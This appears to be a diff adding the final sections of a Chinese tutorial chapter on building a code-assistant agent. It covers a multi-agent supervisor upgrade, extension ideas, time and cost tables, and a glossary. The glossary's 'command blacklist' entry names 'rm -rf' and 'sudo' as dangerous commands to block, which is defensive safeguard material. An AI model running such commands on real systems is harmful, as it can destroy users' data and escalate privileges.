+<h3>17.10.1 ch17 → ch18 多 Agent 升级路径</h3>
+<table><tr><th>升级点</th><th>ch17 单 Agent</th><th>ch18 多 Agent</th></tr><tr><td><strong>架构</strong></td><td>1 个 Agent + 8 工具</td><td>3 Agent（researcher/writer/reviewer）+ supervisor</td></tr><tr><td><strong>任务</strong></td><td>单次代码查询</td><td>长流程（"调研 X 主题 + 写综述 + 引用检查"）</td></tr><tr><td><strong>记忆</strong></td><td>4 种（短期/DB/向量/沙箱）</td><td>4 种 + <strong>跨 Agent 共享</strong></td></tr><tr><td><strong>工具</strong></td><td>8（只读 + shell）</td><td>10（+ web_search / arxiv_search）</td></tr></table>
+<p>ch17 → ch18 不是替换，而是 <strong>ch17 + supervisor 包装层</strong>：</p>
+<pre><code class="language-python"># ch18 supervisor 多包一层
+class ResearchSupervisor:
+    def __init__(self):
+        self.researcher = CodeAssistantAgent(tools=RESEARCH_TOOLS)  # ch17 + 2 工具
+        self.writer = WriterAgent()
+        self.reviewer = ReviewerAgent()</code></pre>
+<h3>17.10.2 5 个扩展方向（ch17 单章内）</h3>
+<table><tr><th>方向</th><th>工作量</th><th>难度</th></tr><tr><td><strong>加更多工具</strong>（如 docker / kubectl / terraform）</td><td>1-2 天</td><td>⭐</td></tr><tr><td><strong>接入 LangSmith / Helicone 做可观测性</strong>（ch22 预告）</td><td>2-3 天</td><td>⭐⭐</td></tr><tr><td><strong>加 semantic code search</strong>（用 tree-sitter + sentence-transformers）</td><td>3-5 天</td><td>⭐⭐⭐</td></tr><tr><td><strong>多仓库支持</strong>（monorepo / Git submodule）</td><td>2-4 天</td><td>⭐⭐</td></tr><tr><td><strong>PR 自动起草</strong>（git commit + PR description + review checklist）</td><td>3-5 天</td><td>⭐⭐</td></tr></table>
+<h3>17.10.3 Part 4 工具矩阵更新</h3>
+<table><tr><th>章</th><th>工具数</th><th>代表工具</th></tr><tr><td>ch16</td><td>5</td><td>日历 / 邮件 / 提醒 / API / 待办</td></tr><tr><td><strong>ch17</strong></td><td><strong>8</strong></td><td><strong>ls/find/grep/git/test/run/lint/format</strong></td></tr><tr><td>ch18</td><td>10</td><td>+ arxiv_search / web_search</td></tr><tr><td>ch19</td><td>12</td><td>+ sql_executor / chart_generator</td></tr><tr><td>ch20</td><td>6</td><td>浏览器专用（navigate / click / extract）</td></tr></table>
+<h3>17.10.4 ch18 多 Agent 完整升级代码</h3>
+<blockquote><strong>注</strong>：<code>WriterAgent / ReviewerAgent</code> 将在 <strong>ch18 §18.5 多 Agent 拆分</strong> 中定义——ch17 §17.10.4 仅展示 supervisor 顶层结构，便于读者理解 ch17 → ch18 的接口边界。</blockquote>
+<p>ch17 单 Agent → ch18 多 Agent 不是替换，是 <strong>包装一层 supervisor</strong>：</p>
+<pre><code class="language-python"># ch18 supervisor.py（在 ch17 基础上）
+from ch17 import CodeAssistantAgent, HANDLERS
+
+class ResearchSupervisor:
+    """ch18 升级：把 ch17 包成 researcher 子 Agent，加 writer + reviewer"""
+
+    def __init__(self):
+        # ch17 Agent 不动，仅加 2 工具（arxiv_search / web_search）
+        self.researcher = CodeAssistantAgent(
+            extra_tools={
+                "arxiv_search": handle_arxiv_search,
+                "web_search": handle_web_search,
+            }
+        )
+        self.writer = WriterAgent(model="claude-3-5-sonnet")
+        self.reviewer = ReviewerAgent(rubric="ch18-academic-rubric")
+
+    def run(self, query: str) -&gt; str:
+        # Step 1: ch17 风格单 Agent 研究（只读 + shell）
+        research_notes = self.researcher.run(f"调研 {query}，输出 5 个关键点")
+        # Step 2: writer 基于研究写综述
+        draft = self.writer.run(f"基于以下研究笔记，写综述：\n{research_notes}")
+        # Step 3: reviewer 检查引用 + 准确性
+        review = self.reviewer.run(f"检查以下综述：\n{draft}")
+        return f"=== 研究 ===\n{research_notes}\n=== 综述 ===\n{draft}\n=== 评审 ===\n{review}"</code></pre>
+<p><strong>核心思想</strong>：ch17 是 ch18 的 <strong>researcher 子 Agent</strong>——ch18 多 Agent 架构 = ch17（升级 2 工具） + 2 个新 Agent + supervisor 包装。读者读完 ch17 即可平滑升级到 ch18。</p>
+<h3>17.10.5 5 个扩展方向（ch17 单章内）</h3>
+<table><tr><th>方向</th><th>工作量</th><th>难度</th><th>收益</th></tr><tr><td><strong>加更多工具</strong>（docker / kubectl / terraform）</td><td>1-2 天</td><td>⭐</td><td>运维场景</td></tr><tr><td><strong>接入 LangSmith / Helicone 做可观测性</strong>（ch22 预告）</td><td>2-3 天</td><td>⭐⭐</td><td>debug 提效</td></tr><tr><td><strong>加 semantic code search</strong>（tree-sitter + sentence-transformers）</td><td>3-5 天</td><td>⭐⭐⭐</td><td>自然语言查代码</td></tr><tr><td><strong>多仓库支持</strong>（monorepo / submodule）</td><td>2-4 天</td><td>⭐⭐</td><td>大型项目</td></tr><tr><td><strong>PR 自动起草</strong>（commit + PR description + review checklist）</td><td>3-5 天</td><td>⭐⭐</td><td>团队协作</td></tr></table>
+<h3>17.10.6 ch17 vs Part 4 其他章节对比</h3>
+<table><tr><th>维度</th><th>ch17 代码助手</th><th>ch18 研究型</th><th>ch19 数据分析</th><th>ch20 Browser-Use</th></tr><tr><td><strong>核心动作</strong></td><td>读代码 / 跑测试</td><td>读论文 / 综述</td><td>查 SQL / 出图</td><td>点网页 / 截图</td></tr><tr><td><strong>主工具</strong></td><td>ls / find / grep / git</td><td>arxiv / web search</td><td>sql / chart</td><td>navigate / click</td></tr><tr><td><strong>风险等级</strong></td><td>🔴 高（shell）</td><td>🟡 中（API 配额）</td><td>🟡 中（破坏性 SQL）</td><td>🟢 低（只在 sandbox）</td></tr><tr><td><strong>多 Agent</strong></td><td>单 Agent</td><td>✅ 3 Agent</td><td>✅ 3 Agent</td><td>单 Agent</td></tr><tr><td><strong>核心知识</strong></td><td>ch07 Function Calling + 安全</td><td>ch11 多 Agent + ch09 RAG</td><td>ch09 RAG + 数据建模</td><td>计算机视觉 + DOM</td></tr><tr><td><strong>预计时长</strong></td><td>10-12h</td><td>15-20h</td><td>15-25h</td><td>8-12h</td></tr></table>
+<p>ch17 是 Part 4 中<strong>安全门槛最高</strong>的——之后 ch18-20 不再专门讲安全（已在 ch17 建立工程直觉）。</p>
+<blockquote><strong>ch17 是 Part 4 唯一高风险章节</strong>——只有 ch17 工具集有真实 shell（subprocess.run），其他 ch18/19/20 工具（arxiv/sql/web/navigate）都是受限 API 或 sandboxed。读者读完 ch17 后，ch18-20 风险等级逐步下降。</blockquote>
+<h3>17.10.7 完整学习路径时间估算</h3>
+<table><tr><th>步骤</th><th>任务</th><th>ch16 基础</th><th>ch17 增量</th></tr><tr><td><strong>0</strong></td><td>已有 ch16 200 行项目</td><td>✅ 5-8h</td><td>-</td></tr><tr><td><strong>1</strong></td><td>跑通 ch17 §17.3.2 30 行最小</td><td>-</td><td>30 min</td></tr><tr><td><strong>2</strong></td><td>拆分为 ch17 §17.5 4 文件结构</td><td>-</td><td>2-3 hours</td></tr><tr><td><strong>3</strong></td><td>加 8 工具 handler（含安全）</td><td>-</td><td>3-4 hours</td></tr><tr><td><strong>4</strong></td><td>pytest §17.9.1 单测</td><td>-</td><td>1-2 hours</td></tr><tr><td><strong>5</strong></td><td>接入 IDE（Continue/Cursor）</td><td>-</td><td>2-3 hours</td></tr><tr><td><strong>6</strong></td><td>跨 ch18 多 Agent 升级</td><td>-</td><td>1-2 hours</td></tr><tr><td><strong>总计</strong></td><td></td><td>5-8h</td><td><strong>10-13h</strong></td></tr></table>
+<p><strong>累计</strong>：从零基础读完 ch17 全章 + 实操完成 = <strong>15-21 hours</strong>（含 ch16 基础）。这是 Part 4 项目中最长的一章——但回报也最大（ch17 代码助手是开发者日常最高频需求）。</p>
+<p>---</p>
+<h2 id="17.11-本章小结">17.11 本章小结</h2>
+<h3>17.11.1 章节小结</h3>
+<p>ch17 在 ch16 基础上构建了一个 <strong>8 工具 + 600 行 4 文件 + IDE 集成 + 安全护栏</strong> 的代码助手 Agent。学完本章，你掌握：</p>
+<table><tr><th>能力</th><th>ch17 子节</th></tr><tr><td><strong>8 工具 JSON Schema 设计</strong></td><td>§17.3-17.4</td></tr><tr><td><strong>ch16 → ch17 演进</strong>（5→8 工具 / 200→600 行 / 单文件→4 文件）</td><td>§17.5</td></tr><tr><td><strong>项目级 4 种记忆 + 沙箱</strong></td><td>§17.6</td></tr><tr><td><strong>5 类危险命令拦截 + audit log + dry-run</strong></td><td>§17.7</td></tr><tr><td><strong>4 IDE 集成 + MCP 协议接入</strong></td><td>§17.8</td></tr><tr><td><strong>pytest + Docker + 5 大调试技巧</strong></td><td>§17.9</td></tr><tr><td><strong>ch18 多 Agent 升级路径</strong></td><td>§17.10</td></tr></table>
+<h3>17.11.2 22 术语速查表</h3>
+<table><tr><th>术语</th><th>英文</th><th>简述</th></tr><tr><td><strong>Code Assistant</strong></td><td>Code Assistant Agent</td><td>能读仓库 / 跑测试 / 提 PR 的 Agent</td></tr><tr><td><strong>Read-only Default</strong></td><td>Read-only Default</td><td>写操作必须显式开启</td></tr><tr><td><strong>Allow Write Flag</strong></td><td>ALLOW_WRITE</td><td>全局布尔开关，启用写操作</td></tr><tr><td><strong>Command Blacklist</strong></td><td>Blacklist</td><td>危险命令字符串列表（<code>rm -rf</code> / <code>sudo</code>）</td></tr><tr><td><strong>Audit Log</strong></td><td>Audit Log</td><td>所有写操作的不可变日志</td></tr><tr><td><strong>Dry-run Mode</strong></td><td>Dry-run</td><td>显示但不执行的预览模式</td></tr><tr><td><strong>Path Whitelist</strong></td><td>Path Whitelist</td><td>允许操作的目录范围（项目根）</td></tr><tr><td><strong>Subprocess</strong></td><td>subprocess</td><td>Python 调用外部命令的标准库</td></tr><tr><td><strong>Sandbox</strong></td><td>Sandbox</td><td>Docker / chroot 隔离执行环境</td></tr><tr><td><strong>MCP</strong></td><td>Model Context Protocol</td><td>模型上下文协议（ch12）</td></tr><tr><td><strong>IDE Sidebar</strong></td><td>IDE Sidebar</td><td>Cursor 风格的内嵌聊天面板</td></tr><tr><td><strong>Cmd+K</strong></td><td>Cmd+K</td><td>Cursor inline edit 快捷键</td></tr><tr><td><strong>Continue.dev</strong></td><td>Continue.dev</td><td>开源 VSCode AI 编程扩展</td></tr><tr><td><strong>Cody</strong></td><td>Cody</td><td>Sourcegraph 的 AI 编程助手</td></tr><tr><td><strong>Claude Code</strong></td><td>Claude Code</td><td>Anthropic 的 CLI 编程助手</td></tr><tr><td><strong>Tree-sitter</strong></td><td>Tree-sitter</td><td>代码语法解析器</td></tr><tr><td><strong>Commit Message Convention</strong></td><td>Commit 规范</td><td>Conventional Commits 等格式</td></tr><tr><td><strong>Project Memory</strong></td><td>Project Memory</td><td>跨对话持久化的项目上下文</td></tr><tr><td><strong>Audit Trail</strong></td><td>Audit Trail</td><td>审计追踪（同 Audit Log）</td></tr><tr><td><strong>Fail-safe</strong></td><td>Fail-safe</td><td>默认安全（bug 时什么也不做）</td></tr><tr><td><strong>Side Effect</strong></td><td>Side Effect</td><td>工具执行产生的副作用（缓存 / 文件修改）</td></tr><tr><td><strong>REPL</strong></td><td>REPL</td><td>Read-Eval-Print Loop（交互式 CLI）</td></tr></table>
+<h3>17.11.3 概念桥 ch17↔ch18</h3>
+<table><tr><th>本章学到的</th><th>ch18 怎么用</th></tr><tr><td><strong>17.4 8 工具 handler</strong></td><td><strong>ch18 §18.4 10 工具 handler</strong> —— 在 ch17 基础上加 <code>arxiv_search</code>（搜论文） + <code>web_search</code>（搜网页）</td></tr><tr><td><strong>17.5 多文件项目结构</strong></td><td><strong>ch18 §18.5 多 Agent 多文件</strong> —— 拆 4 文件为 3 Agent 子项目（researcher/writer/reviewer）+ supervisor 顶层</td></tr><tr><td><strong>17.6 4 种项目级记忆</strong></td><td><strong>ch18 §18.6 长流程记忆</strong> —— 加"任务状态"+"跨 Agent 共享 KB"+"失败重试 counter"</td></tr><tr><td><strong>17.7 安全护栏</strong></td><td><strong>ch18 §18.7 多 Agent 安全</strong> —— 委派时加 task_scope（"研究员不能改代码，只能搜"）</td></tr><tr><td><strong>17.8 IDE + MCP 集成</strong></td><td><strong>ch18 §18.8 Web + ArXiv MCP</strong> —— ch17 的 MCP server 加 2 个新工具</td></tr><tr><td><strong>17.9 测试 + 沙箱</strong></td><td><strong>ch18 §18.9 集成测试 + e2e</strong> —— pytest 单元测试 + ArXiv 真实 API 集成测试</td></tr></table>
+<p><strong>第四部分进度</strong>：2/5 章完成 + 接下来 3 章预告</p>
+<table><tr><th>章</th><th>主题</th><th>预计时长</th></tr><tr><td>ch18</td><td>研究型 Agent</td><td>15-20h</td></tr><tr><td>ch19</td><td>数据分析 Agent</td><td>15-25h</td></tr><tr><td>ch20</td><td>Browser-Use Agent</td><td>8-12h</td></tr></table>
+<h3>17.11.4 ch17 学习路径 5 步</h3>
+<table><tr><th>步骤</th><th>任务</th><th>时间</th><th>验证</th></tr><tr><td><strong>Step 1</strong></td><td>跑通 §17.3.2 30 行最小代码</td><td>30 min</td><td><code>ls / git / find / grep</code> 都返回字符串</td></tr><tr><td><strong>Step 2</strong></td><td>跑通 §17.5 4 文件完整项目</td><td>2 hours</td><td><code>python main.py</code> 进入 REPL，能跑所有 8 工具</td></tr><tr><td><strong>Step 3</strong></td><td>pytest §17.9.1 单元测试</td><td>1 hour</td><td><code>pytest -v</code> 全部 5 个测试通过</td></tr><tr><td><strong>Step 4</strong></td><td>接入 Continue.dev / Cursor</td><td>2-3 hours</td><td>sidebar 能调通 ch17 的 /api/chat 端点</td></tr><tr><td><strong>Step 5</strong></td><td>跑通 §17.5.1 多文件 + audit.log</td><td>3-5 hours</td><td>至少 1 个真实 shell 命令被审计</td></tr></table>
+<p><strong>总计</strong>：8.5-11.5 小时（Step 4-5 视网络 + IDE 安装速度浮动 ±50%）</p>
+<p><strong>如果中途卡住</strong>：回看 §17.3.2 mock 模式 → §17.5.2 tools.py → §17.7 安全护栏（特别是 _BLACKLIST）→ §17.9.1 pytest。</p>
+<h3>17.11.5 ch17 业务价值与 ROI</h3>
+<p>代码助手的商业价值远超个人助理——它直接影响开发者日常工作时间。</p>
+<table><tr><th>任务</th><th>手动耗时</th><th>ch17 耗时</th><th>节省</th></tr><tr><td><strong>查找项目结构</strong>（找所有 *.test.ts）</td><td>5-10 min</td><td>5 sec</td><td>99%</td></tr><tr><td><strong>Code Review 前的 diff 浏览</strong></td><td>15-30 min</td><td>1-2 min</td><td>90%</td></tr><tr><td><strong>梳理 Git 历史 + 找特定 commit</strong></td><td>10-15 min</td><td>10 sec</td><td>98%</td></tr><tr><td><strong>跑测试 + lint + format 全套</strong></td><td>5-10 min</td><td>30 sec</td><td>95%</td></tr><tr><td><strong>新仓库 onboarding（找 README + Dockerfile 等）</strong></td><td>1-2 hours</td><td>5-10 min</td><td>90%</td></tr></table>
+<p><strong>保守估计</strong>：ch17 代码助手每天为开发者节省 <strong>1-2 小时</strong>。按开发者年薪 $100k 算，相当于每年节省 $12.5k-25k / 人——远超 ch17 的实施成本（10-12 hours first-time setup）。</p>
+<h3>17.11.6 与 ch24 成本章节的衔接</h3>
+<p>ch17 的 Token 成本估算（沿用 ch16 §16.3.2 GPT-4o-mini）：</p>
+<table><tr><th>任务</th><th>平均 Token</th><th>单次成本</th><th>月度（30 次/天）</th></tr><tr><td>ls / find / grep（短 query）</td><td>200 / 100</td><td>$0.00006</td><td>$0.054</td></tr><tr><td>全 ReAct 链（8 工具串）</td><td>2000 / 800</td><td>$0.0006</td><td>$0.54</td></tr><tr><td>月度总计</td><td></td><td></td><td><strong>~$1-3 / 月</strong></td></tr></table>
+<p><strong>vs Cursor Pro $20/月</strong>：ch17 自部署便宜 10×。ch24 会详细对比自部署 vs SaaS 的成本权衡。</p>
+<p>---</p>
+<p><strong>本章小结</strong>：</p>
+<blockquote><strong>ch17 = Part 4 Day 2 = 项目 2 = 第一个有安全护栏的项目</strong>。<br>学完本章，你已掌握：8 工具 handler + 600 行 4 文件 + 项目级 4 种记忆 + 5 类危险命令拦截 + 4 IDE 集成 + MCP 协议 + pytest 调试 + ch18 多 Agent 升级路径。<br><br><strong>下一章预告</strong>：ch18《项目 3 — 研究型 Agent》—— 在 ch17 基础上加 web_search + arxiv_search 两个外部 API 工具 + 升级为多 Agent 架构（researcher/writer/reviewer + supervisor）+ 长流程任务管理（ch18 是 Part 4 第一个多 Agent 项目）。</blockquote>
+
+<nav class="chapter-pager">
+<a href="ch16.html">← 上一章：第 16 章 — 个人助理 Agent</a>
+<a href="ch18.html" style="opacity:0.6;">下一章：第 18 章 — 研究型 Agent →</a>
+</nav>
+
+<footer>
+<a href="index.html">← 返回章节目录</a> · 第 17 章 · AGENT开发从入门到精通
+</footer>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
